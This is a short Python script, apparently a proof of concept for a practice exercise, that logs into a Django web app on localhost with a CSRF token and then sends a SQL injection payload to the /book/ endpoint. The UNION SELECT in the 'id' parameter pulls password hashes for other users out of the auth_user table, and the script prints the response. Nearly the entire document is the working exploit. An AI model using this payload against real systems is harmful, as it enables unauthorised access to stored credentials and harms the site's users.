import requests

session = requests.Session()
base_url = 'http://localhost:8000'

# Retrieve the CSRF token
session.get(f'{base_url}/login/')
csrf_token = session.cookies.get('csrftoken')

# Log in
response = session.post(
    f'{base_url}/login/',
    data={
        'username': 'alice',
        'password': '12345',
        'csrfmiddlewaretoken': csrf_token,
    },
)

# assuming you already have id somehow
account_id = 2
query = f'{account_id}" UNION SELECT password FROM auth_user WHERE id != "0'

response = session.get(
    f'{base_url}/book/',
    params={'id': query},
)

print(response.status_code)
print(response.url)
print(response.text)
